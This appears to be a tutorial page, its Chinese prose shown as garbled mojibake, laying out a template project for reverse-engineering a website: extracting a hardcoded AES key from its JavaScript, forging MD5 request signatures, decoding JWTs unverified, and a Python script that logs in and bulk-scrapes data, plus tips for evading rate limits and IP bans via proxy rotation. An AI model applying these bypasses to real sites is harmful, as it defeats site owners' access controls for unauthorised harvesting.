â”œâ”€â”€ docs/
â”‚   â”œâ”€â”€ analysis.md           # åˆ†ææ–‡æ¡£
â”‚   â”œâ”€â”€ api_reference.md      # API æ¥å£æ–‡æ¡£
â”‚   â”œâ”€â”€ crypto_analysis.md    # åŠ å¯†åˆ†æ
â”‚   â””â”€â”€ findings.md           # å‘ç°å’Œæ€»ç»“
â”œâ”€â”€ scripts/
â”‚   â”œâ”€â”€ __init__.py
â”‚   â”œâ”€â”€ decrypt.py            # è§£å¯†è„šæœ¬
â”‚   â”œâ”€â”€ sign.py               # ç­¾åç”Ÿæˆ
â”‚   â””â”€â”€ reproduce.py          # å®Œæ•´å¤ç°
â”œâ”€â”€ hooks/
â”‚   â”œâ”€â”€ network_monitor.js    # ç½‘ç»œç›‘æ§
â”‚   â”œâ”€â”€ crypto_hook.js        # åŠ å¯†å‡½æ•°Hook
â”‚   â””â”€â”€ debugger_bypass.js    # åè°ƒè¯•ç»•è¿‡
â”œâ”€â”€ test_cases/
â”‚   â”œâ”€â”€ test_decrypt.py       # è§£å¯†æµ‹è¯•
â”‚   â”œâ”€â”€ test_sign.py          # ç­¾åæµ‹è¯•
â”‚   â””â”€â”€ test_api.py           # API æµ‹è¯•
â”œâ”€â”€ data/
â”‚   â”œâ”€â”€ samples/              # æ ·æœ¬æ•°æ®
â”‚   â””â”€â”€ results/              # åˆ†æç»“æœ
â”œâ”€â”€ assets/
â”‚   â”œâ”€â”€ screenshots/          # æˆªå›¾
â”‚   â””â”€â”€ diagrams/             # æµç¨‹å›¾
â”œâ”€â”€ requirements.txt
â”œâ”€â”€ README.md
â””â”€â”€ .env.example
</code></pre>

      <hr />

      <h2 id="æ–‡ä»¶æ¨¡æ¿">ğŸ“„ æ–‡ä»¶æ¨¡æ¿</h2>

      <h3 id="1-docsanalysismd">1. docs/analysis.md</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="gh"># [ç½‘ç«™åç§°] é€†å‘åˆ†æ</span>

<span class="gu">## åŸºæœ¬ä¿¡æ¯</span>

| é¡¹ç›® | è¯´æ˜ |
|------|------|
| <span class="gs">**ç›®æ ‡ç½‘ç«™**</span> | https://example.com |
| <span class="gs">**åˆ†ææ—¥æœŸ**</span> | 2024-01-15 |
| <span class="gs">**éš¾åº¦ç­‰çº§**</span> | â­â­â­ |
| <span class="gs">**ä¸»è¦æŠ€æœ¯**</span> | JavaScript æ··æ·†ã€AES åŠ å¯†ã€ç­¾åéªŒè¯ |

---

<span class="gu">## ç›®æ ‡</span>

<span class="k">- â˜</span> åˆ†æç™»å½•æ¥å£åŠ å¯†é€»è¾‘
<span class="k">- â˜</span> ç ´è§£ API ç­¾åç®—æ³•
<span class="k">- â˜</span> å®ç°å®Œæ•´çš„ Python å¤ç°
<span class="k">- â˜</span> ç¼–å†™è‡ªåŠ¨åŒ–çˆ¬è™«

---

<span class="gu">## æŠ€æœ¯æ ˆåˆ†æ</span>

<span class="gu">### å‰ç«¯æŠ€æœ¯</span>
<span class="k">-</span><span class="w"> </span><span class="gs">**æ¡†æ¶**</span>: Vue.js 3.x
<span class="k">-</span><span class="w"> </span><span class="gs">**æ‰“åŒ…å·¥å…·**</span>: Webpack 5
<span class="k">-</span><span class="w"> </span><span class="gs">**æ··æ·†**</span>: JavaScript Obfuscator

<span class="gu">### åç«¯æŠ€æœ¯</span>
<span class="k">-</span><span class="w"> </span><span class="gs">**æœåŠ¡å™¨**</span>: Nginx + Node.js
<span class="k">-</span><span class="w"> </span><span class="gs">**API æ ¼å¼**</span>: RESTful JSON
<span class="k">-</span><span class="w"> </span><span class="gs">**è®¤è¯æ–¹å¼**</span>: JWT Token

---

<span class="gu">## åˆ†ææµç¨‹</span>

<span class="gu">### 1. åˆæ­¥ä¾¦å¯Ÿ</span>

<span class="gs">**å·¥å…·**</span>: Chrome DevTools

<span class="k">1.</span> æ‰“å¼€ç½‘ç«™ï¼Œæ£€æŸ¥ç½‘ç»œè¯·æ±‚
<span class="k">2.</span> è¯†åˆ«å…³é”® API æ¥å£
<span class="k">3.</span> è§‚å¯Ÿè¯·æ±‚å‚æ•°å’Œå“åº”æ ¼å¼

<span class="gs">**å‘ç°**</span>:
<span class="k">-</span><span class="w"> </span>ç™»å½•æ¥å£: <span class="sb">`/api/auth/login`</span>
<span class="k">-</span><span class="w"> </span>ä¸»è¦å‚æ•°: <span class="sb">`username`</span>, <span class="sb">`password`</span>, <span class="sb">`timestamp`</span>, <span class="sb">`sign`</span>

<span class="gu">### 2. JavaScript åˆ†æ</span>

<span class="gs">**å…¥å£æ–‡ä»¶**</span>: <span class="sb">`app.js`</span>

å…³é”®ä»£ç ä½ç½®:
```javascript
// ä½ç½®: app.js:1234
function encryptPassword(password) {
    // AES åŠ å¯†å®ç°
}

// ä½ç½®: app.js:5678
function generateSign(params) {
    // ç­¾åç”Ÿæˆé€»è¾‘
}
</code></pre>
      </div>

      <h3 id="3-åŠ å¯†ç®—æ³•è¯†åˆ«">3. åŠ å¯†ç®—æ³•è¯†åˆ«</h3>

      <p>è¯¦è§ <a href="./crypto_analysis.md">crypto_analysis.md</a></p>

      <h3 id="4-å¤ç°å®ç°">4. å¤ç°å®ç°</h3>

      <p>è¯¦è§ <a href="../scripts/reproduce.py">reproduce.py</a></p>

      <hr />

      <h2 id="æ—¶é—´çº¿">æ—¶é—´çº¿</h2>

      <table>
        <thead>
          <tr>
            <th>æ—¥æœŸ</th>
            <th>è¿›å±•</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td>2024-01-15</td>
            <td>å®Œæˆåˆæ­¥ä¾¦å¯Ÿ</td>
          </tr>
          <tr>
            <td>2024-01-16</td>
            <td>è¯†åˆ«åŠ å¯†ç®—æ³•ä¸º AES-128-CBC</td>
          </tr>
          <tr>
            <td>2024-01-17</td>
            <td>ç ´è§£ç­¾åç®—æ³•</td>
          </tr>
          <tr>
            <td>2024-01-18</td>
            <td>Python å¤ç°æˆåŠŸ</td>
          </tr>
        </tbody>
      </table>

      <hr />

      <h2 id="å‚è€ƒèµ„æº">å‚è€ƒèµ„æº</h2>

      <ul>
        <li><a href="https://example.com/docs">å®˜æ–¹æ–‡æ¡£</a></li>
        <li><a href="https://github.com/...">ç›¸å…³è®¨è®º</a></li>
      </ul>

      <pre><code>
### 2. docs/crypto_analysis.md

```markdown
# åŠ å¯†åˆ†ææ–‡æ¡£

## å¯†ç åŠ å¯†

### ç®—æ³•è¯†åˆ«

**ç‰¹å¾**:
- è¾“å‡ºé•¿åº¦: 32 å­—ç¬¦ï¼ˆBase64 ç¼–ç ï¼‰
- å›ºå®š IV: `1234567890abcdef`

**ç»“è®º**: AES-128-CBC

### å…³é”®ä»£ç 

```javascript
// åŸå§‹ä»£ç  (app.js:1234)
function encryptPassword(password) {
    const key = CryptoJS.enc.Utf8.parse('secretkey1234567');
    const iv = CryptoJS.enc.Utf8.parse('1234567890abcdef');

    const encrypted = CryptoJS.AES.encrypt(password, key, {
        iv: iv,
        mode: CryptoJS.mode.CBC,
        padding: CryptoJS.pad.Pkcs7
    });

    return encrypted.toString();
}
</code></pre>

      <h3 id="python-å®ç°">Python å®ç°</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">Crypto.Cipher</span><span class="w"> </span><span class="kn">import</span> <span class="n">AES</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">Crypto.Util.Padding</span><span class="w"> </span><span class="kn">import</span> <span class="n">pad</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">base64</span>

<span class="k">def</span><span class="w"> </span><span class="nf">encrypt_password</span><span class="p">(</span><span class="n">password</span><span class="p">):</span>
    <span class="n">key</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;secretkey1234567&#39;</span>
    <span class="n">iv</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;1234567890abcdef&#39;</span>

    <span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span>
    <span class="n">encrypted</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">pad</span><span class="p">(</span><span class="n">password</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span> <span class="mi">16</span><span class="p">))</span>

    <span class="k">return</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">encrypted</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>

<span class="c1"># æµ‹è¯•</span>
<span class="nb">print</span><span class="p">(</span><span class="n">encrypt_password</span><span class="p">(</span><span class="s1">&#39;mypassword&#39;</span><span class="p">))</span>
</code></pre>
      </div>

      <hr />

      <h2 id="ç­¾åç®—æ³•">ç­¾åç®—æ³•</h2>

      <h3 id="ç®—æ³•è¯†åˆ«">ç®—æ³•è¯†åˆ«</h3>

      <p><strong>ç‰¹å¾</strong>:</p>

      <ul>
        <li>è¾“å‡ºé•¿åº¦: 32 å­—ç¬¦</li>
        <li>åå…­è¿›åˆ¶æ ¼å¼</li>
      </ul>

      <p><strong>ç»“è®º</strong>: MD5</p>

      <h3 id="ç­¾åè§„åˆ™">ç­¾åè§„åˆ™</h3>

      <pre><code>sign = MD5(param1 + param2 + timestamp + secret_key)
</code></pre>

      <p><strong>å‚æ•°é¡ºåº</strong>: æŒ‰å­—å…¸åºæ’åˆ—</p>

      <h3 id="å®Œæ•´å®ç°">å®Œæ•´å®ç°</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">hashlib</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">time</span>

<span class="k">def</span><span class="w"> </span><span class="nf">generate_sign</span><span class="p">(</span><span class="n">params</span><span class="p">):</span>
    <span class="c1"># æ·»åŠ æ—¶é—´æˆ³</span>
    <span class="n">params</span><span class="p">[</span><span class="s1">&#39;timestamp&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span> <span class="o">*</span> <span class="mi">1000</span><span class="p">)</span>

    <span class="c1"># æŒ‰å­—å…¸åºæ’åº</span>
    <span class="n">sorted_params</span> <span class="o">=</span> <span class="nb">sorted</span><span class="p">(</span><span class="n">params</span><span class="o">.</span><span class="n">items</span><span class="p">())</span>

    <span class="c1"># æ‹¼æ¥å­—ç¬¦ä¸²</span>
    <span class="n">sign_str</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">k</span><span class="si">}{</span><span class="n">v</span><span class="si">}</span><span class="s1">&#39;</span> <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">sorted_params</span><span class="p">])</span>

    <span class="c1"># æ·»åŠ å¯†é’¥</span>
    <span class="n">sign_str</span> <span class="o">+=</span> <span class="s1">&#39;secret_key_here&#39;</span>

    <span class="c1"># MD5 å“ˆå¸Œ</span>
    <span class="k">return</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">sign_str</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>

<span class="c1"># æµ‹è¯•</span>
<span class="n">params</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="s1">&#39;admin&#39;</span><span class="p">,</span>
    <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="s1">&#39;encrypted_password_here&#39;</span>
<span class="p">}</span>
<span class="nb">print</span><span class="p">(</span><span class="n">generate_sign</span><span class="p">(</span><span class="n">params</span><span class="p">))</span>
</code></pre>
      </div>

      <hr />

      <h2 id="token-æœºåˆ¶">Token æœºåˆ¶</h2>

      <h3 id="jwt-ç»“æ„">JWT ç»“æ„</h3>

      <pre><code>Header.Payload.Signature
</code></pre>

      <p><strong>ç¤ºä¾‹</strong>:</p>

      <pre><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMjM0NX0.xyz...
</code></pre>

      <h3 id="è§£ç ">è§£ç </h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">jwt</span>

<span class="n">token</span> <span class="o">=</span> <span class="s2">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...&quot;</span>
<span class="n">decoded</span> <span class="o">=</span> <span class="n">jwt</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="n">decoded</span><span class="p">)</span>
<span class="c1"># {&#39;user_id&#39;: 12345, &#39;exp&#39;: 1705305600}</span>
</code></pre>
      </div>

      <hr />

      <h2 id="åçˆ¬æªæ–½">åçˆ¬æªæ–½</h2>

      <h3 id="1-user-agent-æ£€æµ‹">1. User-Agent æ£€æµ‹</h3>

      <ul>
        <li><strong>æªæ–½</strong>: å¿…é¡»åŒ…å«çœŸå®æµè§ˆå™¨ UA</li>
        <li><strong>ç»•è¿‡</strong>: ä½¿ç”¨çœŸå® Chrome UA</li>
      </ul>

      <h3 id="2-é¢‘ç‡é™åˆ¶">2. é¢‘ç‡é™åˆ¶</h3>

      <ul>
        <li><strong>æªæ–½</strong>: æ¯åˆ†é’Ÿæœ€å¤š 60 è¯·æ±‚</li>
        <li><strong>ç»•è¿‡</strong>: æ·»åŠ éšæœºå»¶è¿Ÿ (1-3ç§’)</li>
      </ul>

      <h3 id="3-ip-å°ç¦">3. IP å°ç¦</h3>

      <ul>
        <li><strong>æªæ–½</strong>: åŒä¸€ IP è¿‡å¤šè¯·æ±‚ä¼šè¢«å°</li>
        <li><strong>ç»•è¿‡</strong>: ä½¿ç”¨ä»£ç†æ± è½®æ¢</li>
      </ul>

      <pre><code>
### 3. scripts/reproduce.py

```python
"""
å®Œæ•´å¤ç°è„šæœ¬
"""
import requests
import hashlib
import time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import base64
import json


class TargetAPI:
    """ç›®æ ‡ç½‘ç«™ API å°è£…"""

    def __init__(self):
        self.base_url = "https://example.com"
        self.session = requests.Session()
        self.token = None

        # è®¾ç½®è¯·æ±‚å¤´
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Content-Type': 'application/json',
            'Accept': 'application/json',
        })

    def encrypt_password(self, password: str) -&gt; str:
        """
        AES åŠ å¯†å¯†ç 

        Args:
            password: æ˜æ–‡å¯†ç 

        Returns:
            åŠ å¯†åçš„ Base64 å­—ç¬¦ä¸²
        """
        key = b'secretkey1234567'
        iv = b'1234567890abcdef'

        cipher = AES.new(key, AES.MODE_CBC, iv)
        encrypted = cipher.encrypt(pad(password.encode(), 16))

        return base64.b64encode(encrypted).decode()

    def generate_sign(self, params: dict) -&gt; dict:
        """
        ç”Ÿæˆç­¾å

        Args:
            params: è¯·æ±‚å‚æ•°

        Returns:
            æ·»åŠ äº† timestamp å’Œ sign çš„å‚æ•°å­—å…¸
        """
        # æ·»åŠ æ—¶é—´æˆ³
        params['timestamp'] = int(time.time() * 1000)

        # æŒ‰å­—å…¸åºæ’åº
        sorted_params = sorted(params.items())

        # æ‹¼æ¥å­—ç¬¦ä¸²
        sign_str = ''.join([f'{k}{v}' for k, v in sorted_params])

        # æ·»åŠ å¯†é’¥
        sign_str += 'secret_key_here'

        # MD5 å“ˆå¸Œ
        params['sign'] = hashlib.md5(sign_str.encode()).hexdigest()

        return params

    def login(self, username: str, password: str) -&gt; bool:
        """
        ç™»å½•

        Args:
            username: ç”¨æˆ·å
            password: å¯†ç 

        Returns:
            æ˜¯å¦ç™»å½•æˆåŠŸ
        """
        # åŠ å¯†å¯†ç 
        encrypted_password = self.encrypt_password(password)

        # å‡†å¤‡å‚æ•°
        params = {
            'username': username,
            'password': encrypted_password
        }

        # ç”Ÿæˆç­¾å
        params = self.generate_sign(params)

        # å‘é€è¯·æ±‚
        url = f"{self.base_url}/api/auth/login"
        response = self.session.post(url, json=params)

        if response.status_code == 200:
            data = response.json()
            if data.get('code') == 0:
                self.token = data['data']['token']
                self.session.headers['Authorization'] = f'Bearer {self.token}'
                print(f"âœ… ç™»å½•æˆåŠŸ! Token: {self.token[:20]}...")
                return True

        print(f"âŒ ç™»å½•å¤±è´¥: {response.text}")
        return False

    def get_user_info(self) -&gt; dict:
        """
        è·å–ç”¨æˆ·ä¿¡æ¯

        Returns:
            ç”¨æˆ·ä¿¡æ¯å­—å…¸
        """
        if not self.token:
            raise Exception("æœªç™»å½•ï¼Œè¯·å…ˆè°ƒç”¨ login()")

        url = f"{self.base_url}/api/user/info"
        response = self.session.get(url)

        if response.status_code == 200:
            return response.json()

        return None

    def get_data(self, page: int = 1, size: int = 20) -&gt; list:
        """
        è·å–æ•°æ®åˆ—è¡¨

        Args:
            page: é¡µç 
            size: æ¯é¡µæ•°é‡

        Returns:
            æ•°æ®åˆ—è¡¨
        """
        if not self.token:
            raise Exception("æœªç™»å½•ï¼Œè¯·å…ˆè°ƒç”¨ login()")

        params = {
            'page': page,
            'size': size
        }

        # ç”Ÿæˆç­¾å
        params = self.generate_sign(params)

        url = f"{self.base_url}/api/data/list"
        response = self.session.get(url, params=params)

        if response.status_code == 200:
            data = response.json()
            return data.get('data', {}).get('items', [])

        return []


def main():
    """ä¸»å‡½æ•°"""
    print("=" * 50)
    print("ç›®æ ‡ç½‘ç«™ API å¤ç°æµ‹è¯•")
    print("=" * 50)

    # åˆ›å»º API å®ä¾‹
    api = TargetAPI()

    # ç™»å½•
    if api.login('your_username', 'your_password'):
        # è·å–ç”¨æˆ·ä¿¡æ¯
        user_info = api.get_user_info()
        print(f"\nç”¨æˆ·ä¿¡æ¯: {json.dumps(user_info, indent=2, ensure_ascii=False)}")

        # è·å–æ•°æ®
        data = api.get_data(page=1, size=10)
        print(f"\nè·å–åˆ° {len(data)} æ¡æ•°æ®")

        # ä¿å­˜æ•°æ®
        with open('data/results/output.json', 'w', encoding='utf-8') as f:
            json.dump(data, f, ensure_ascii=False, indent=2)

        print("\nâœ… æ•°æ®å·²ä¿å­˜åˆ° data/results/output.json")


if __name__ == '__main__':
    main()
</code></pre>

      <h3 id="4-test_casestest_decryptpy">4. test_cases/test_decrypt.py</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">è§£å¯†åŠŸèƒ½æµ‹è¯•</span>
<span class="sd">&quot;&quot;&quot;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">unittest</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">scripts.reproduce</span><span class="w"> </span><span class="kn">import</span> <span class="n">TargetAPI</span>


<span class="k">class</span><span class="w"> </span><span class="nc">TestDecrypt</span><span class="p">(</span><span class="n">unittest</span><span class="o">.</span><span class="n">TestCase</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;è§£å¯†æµ‹è¯•ç”¨ä¾‹&quot;&quot;&quot;</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">setUp</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;åˆå§‹åŒ–&quot;&quot;&quot;</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">api</span> <span class="o">=</span> <span class="n">TargetAPI</span><span class="p">()</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">test_encrypt_password</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;æµ‹è¯•å¯†ç åŠ å¯†&quot;&quot;&quot;</span>
        <span class="n">password</span> <span class="o">=</span> <span class="s2">&quot;test123&quot;</span>
        <span class="n">encrypted</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">api</span><span class="o">.</span><span class="n">encrypt_password</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>

        <span class="c1"># éªŒè¯è¾“å‡ºæ ¼å¼</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">assertIsInstance</span><span class="p">(</span><span class="n">encrypted</span><span class="p">,</span> <span class="nb">str</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">assertGreater</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">encrypted</span><span class="p">),</span> <span class="mi">0</span><span class="p">)</span>

        <span class="c1"># éªŒè¯ Base64 æ ¼å¼</span>
        <span class="kn">import</span><span class="w"> </span><span class="nn">base64</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">encrypted</span><span class="p">)</span>
            <span class="n">is_base64</span> <span class="o">=</span> <span class="kc">True</span>
        <span class="k">except</span><span class="p">:</span>
            <span class="n">is_base64</span> <span class="o">=</span> <span class="kc">False</span>

        <span class="bp">self</span><span class="o">.</span><span class="n">assertTrue</span><span class="p">(</span><span class="n">is_base64</span><span class="p">)</span>

        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;âœ… åŠ å¯†æµ‹è¯•é€šè¿‡: </span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="s2"> -&gt; </span><span class="si">{</span><span class="n">encrypted</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">test_sign_generation</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;æµ‹è¯•ç­¾åç”Ÿæˆ&quot;&quot;&quot;</span>
        <span class="n">params</span> <span class="o">=</span> <span class="p">{</span>
            <span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="s1">&#39;test&#39;</span><span class="p">,</span>
            <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="s1">&#39;encrypted_pass&#39;</span>
        <span class="p">}</span>

        <span class="n">signed_params</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">api</span><span class="o">.</span><span class="n">generate_sign</span><span class="p">(</span><span class="n">params</span><span class="o">.</span><span class="n">copy</span><span class="p">())</span>

        <span class="c1"># éªŒè¯ç­¾åå­—æ®µå­˜åœ¨</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">assertIn</span><span class="p">(</span><span class="s1">&#39;sign&#39;</span><span class="p">,</span> <span class="n">signed_params</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">assertIn</span><span class="p">(</span><span class="s1">&#39;timestamp&#39;</span><span class="p">,</span> <span class="n">signed_params</span><span class="p">)</span>

        <span class="c1"># éªŒè¯ç­¾åæ ¼å¼ (32ä½ MD5)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">assertEqual</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">signed_params</span><span class="p">[</span><span class="s1">&#39;sign&#39;</span><span class="p">]),</span> <span class="mi">32</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">assertTrue</span><span class="p">(</span><span class="n">signed_params</span><span class="p">[</span><span class="s1">&#39;sign&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">isalnum</span><span class="p">())</span>

        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;âœ… ç­¾åæµ‹è¯•é€šè¿‡: </span><span class="si">{</span><span class="n">signed_params</span><span class="p">[</span><span class="s1">&#39;sign&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">test_sign_consistency</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;æµ‹è¯•ç­¾åä¸€è‡´æ€§&quot;&quot;&quot;</span>
        <span class="n">params</span> <span class="o">=</span> <span class="p">{</span>
            <span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="s1">&#39;test&#39;</span><span class="p">,</span>
            <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="s1">&#39;encrypted_pass&#39;</span><span class="p">,</span>
            <span class="s1">&#39;timestamp&#39;</span><span class="p">:</span> <span class="mi">1234567890000</span>
        <span class="p">}</span>

        <span class="c1"># åŒæ ·çš„å‚æ•°åº”è¯¥ç”ŸæˆåŒæ ·çš„ç­¾å</span>
        <span class="n">sign1</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">api</span><span class="o">.</span><span class="n">generate_sign</span><span class="p">(</span><span class="n">params</span><span class="o">.</span><span class="n">copy</span><span class="p">())[</span><span class="s1">&#39;sign&#39;</span><span class="p">]</span>
        <span class="n">sign2</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">api</span><span class="o">.</span><span class="n">generate_sign</span><span class="p">(</span><span class="n">params</span><span class="o">.</span><span class="n">copy</span><span class="p">())[</span><span class="s1">&#39;sign&#39;</span><span class="p">]</span>

        <span class="bp">self</span><span class="o">.</span><span class="n">assertEqual</span><span class="p">(</span><span class="n">sign1</span><span class="p">,</span> <span class="n">sign2</span><span class="p">)</span>

        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;âœ… ç­¾åä¸€è‡´æ€§æµ‹è¯•é€šè¿‡&quot;</span><span class="p">)</span>


<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="n">unittest</span><span class="o">.</span><span class="n">main</span><span class="p">()</span>
</code></pre>
      </div>

      <h3 id="5-readmemd">5. README.md</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="gh"># [ç½‘ç«™åç§°] é€†å‘åˆ†æé¡¹ç›®</span>

æœ¬é¡¹ç›®æ˜¯å¯¹ [ç›®æ ‡ç½‘ç«™] çš„å®Œæ•´é€†å‘åˆ†æå’Œ Python å¤ç°å®ç°ã€‚

---

<span class="gu">## é¡¹ç›®æ¦‚è¿°</span>

<span class="gs">**ç›®æ ‡**</span>: åˆ†æå¹¶å¤ç°ç›®æ ‡ç½‘ç«™çš„ç™»å½•ã€æ•°æ®è·å–ç­‰æ ¸å¿ƒåŠŸèƒ½

<span class="gs">**ä¸»è¦æˆæœ**</span>:
<span class="k">-</span><span class="w"> </span>âœ… ç ´è§£ AES-128-CBC å¯†ç åŠ å¯†
<span class="k">-</span><span class="w"> </span>âœ… é€†å‘ MD5 ç­¾åç®—æ³•
<span class="k">-</span><span class="w"> </span>âœ… å®ç°å®Œæ•´çš„ Python API å°è£…
<span class="k">-</span><span class="w"> </span>âœ… ç¼–å†™è¯¦ç»†çš„åˆ†ææ–‡æ¡£

---

<span class="gu">## å¿«é€Ÿå¼€å§‹</span>

<span class="gu">### 1. å®‰è£…ä¾èµ–</span>

```bash
pip install -r requirements.txt
</code></pre>
      </div>

      <h3 id="2-é…ç½®å‚æ•°">2. é…ç½®å‚æ•°</h3>

      <div class="codehilite">
        <pre><span></span><code>cp<span class="w"> </span>.env.example<span class="w"> </span>.env
<span class="c1"># ç¼–è¾‘ .env æ–‡ä»¶ï¼Œå¡«å…¥è´¦å·å¯†ç </span>
</code></pre>
      </div>

      <h3 id="3-è¿è¡Œå¤ç°è„šæœ¬">3. è¿è¡Œå¤ç°è„šæœ¬</h3>

      <div class="codehilite">
        <pre><span></span><code>python<span class="w"> </span>scripts/reproduce.py
</code></pre>
      </div>

      <hr />

      <h2 id="é¡¹ç›®ç»“æ„-2">é¡¹ç›®ç»“æ„</h2>

      <pre><code>.
â”œâ”€â”€ docs/              # åˆ†ææ–‡æ¡£
â”œâ”€â”€ scripts/           # å¤ç°è„šæœ¬
â”œâ”€â”€ hooks/             # Hook è„šæœ¬
â”œâ”€â”€ test_cases/        # æµ‹è¯•ç”¨ä¾‹
â”œâ”€â”€ data/              # æ•°æ®ç›®å½•
â””â”€â”€ assets/            # èµ„æºæ–‡ä»¶
</code></pre>

      <hr />

      <h2 id="åˆ†ææ–‡æ¡£">åˆ†ææ–‡æ¡£</h2>

      <p>è¯¦ç»†çš„åˆ†æè¿‡ç¨‹è§:</p>

      <ul>
        <li><a href="#03-Basic-Recipes-dynamic-parameter-analysis">å®Œæ•´åˆ†ææ–‡æ¡£</a></li>
        <li><a href="./docs/crypto_analysis.md">åŠ å¯†ç®—æ³•åˆ†æ</a></li>
        <li><a href="./docs/api_reference.md">API æ¥å£æ–‡æ¡£</a></li>
      </ul>

      <hr />

      <h2 id="ä¸»è¦æŠ€æœ¯">ä¸»è¦æŠ€æœ¯</h2>

      <ul>
        <li><strong>åŠ å¯†</strong>: AES-128-CBC</li>
        <li><strong>ç­¾å</strong>: MD5 å“ˆå¸Œ</li>
        <li><strong>è®¤è¯</strong>: JWT Token</li>
        <li><strong>åæ··æ·†</strong>: AST è§£æ</li>
      </ul>

      <hr />

      <h2 id="ä½¿ç”¨ç¤ºä¾‹">ä½¿ç”¨ç¤ºä¾‹</h2>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">scripts.reproduce</span><span class="w"> </span><span class="kn">import</span> <span class="n">TargetAPI</span>

<span class="c1"># åˆ›å»º API å®ä¾‹</span>
<span class="n">api</span> <span class="o">=</span> <span class="n">TargetAPI</span><span class="p">()</span>

